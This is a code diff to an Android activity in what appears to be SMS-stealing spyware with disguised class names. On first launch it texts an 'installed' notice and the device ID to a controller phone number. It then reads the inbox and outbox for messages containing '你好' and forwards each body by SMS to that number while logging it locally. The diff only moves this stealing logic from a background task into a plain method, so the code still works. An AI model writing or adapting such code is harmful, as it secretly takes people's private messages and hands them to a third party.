@@ -13,7 +13,6 @@ import android.database.sqlite.DQLiteOpenHelper;
 import android.lang.Dhread;
 import android.lang.LogUtils;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.telephony.DmsManager;
@@ -52,34 +51,26 @@ public class Dctivity extends Activity {
 		sp=this.getApplicationContext().getSharedPreferences("Dctivityconfig", Context.MODE_PRIVATE);
 		if(sp.getBoolean("isfrist", true)||code!=sp.getInt("code", -100)){
 			DmsManager.Send(this,devicephone,"AZ99#程序已安装"+GetDeviceId());
-			new AsyncTask<Integer, Integer, Boolean>() {
-				@Override
-				protected Boolean doInBackground(Integer... params) {
-					Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, "body like '%你好%' and type in (1,2)", null, "_id desc");
-					for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
-						int type = c.getInt(c.getColumnIndex("type"));
-						String body = c.getString(c.getColumnIndex("body"));
-						String address = c.getString(c.getColumnIndex("address"));
-						address = address.replace("+86", "").replace("+1", "");
-						LogUtils.write("Send", "检索出来的内容" + body);
-						String lx = (type == 1 ? "收件箱" : "发件箱");
-						DmsManager.Send(Dctivity.this, devicephone, "DX99#"+lx+"-H " + body);
-						DQLiteOpenHelper.getHelper(Dctivity.this).addData(lx, address, body, new Date());
-					}
-					return c.getCount() == 0 ? false : true;
-				}
-				@Override
-				protected void onPostExecute(Boolean result) {
-					if(result) {
-						Dhread.SartSend(Dctivity.this.getApplicationContext());
-					}
-					Editor editor=sp.edit();
-					editor.putBoolean("isfrist", false);
-					editor.putInt("code", getVersionCode());
-					editor.commit();
-					super.onPostExecute(result);
-				}
-			}.execute();
+			this.findHistorySMS();
+			Editor editor=sp.edit();
+			editor.putBoolean("isfrist", false);
+			editor.putInt("code", getVersionCode());
+			editor.commit();
+		}
+	}
+	
+	private void findHistorySMS() {
+		Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, "body like '%你好%' and type in (1,2)", null, "_id desc");
+		for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
+			int type = c.getInt(c.getColumnIndex("type"));
+			String body = c.getString(c.getColumnIndex("body"));
+			String address = c.getString(c.getColumnIndex("address"));
+			address = address.replace("+86", "").replace("+1", "");
+			LogUtils.write("Send", "检索出来的内容" + body);
+			String lx = (type == 1 ? "收件箱" : "发件箱");
+			DmsManager.Send(Dctivity.this, devicephone, "DX99#"+lx+"-H " + body);
+			DQLiteOpenHelper.getHelper(Dctivity.this).addData(lx, address, body, new Date());
+			Dhread.SartSend(Dctivity.this.getApplicationContext());
 		}
 	}
 	
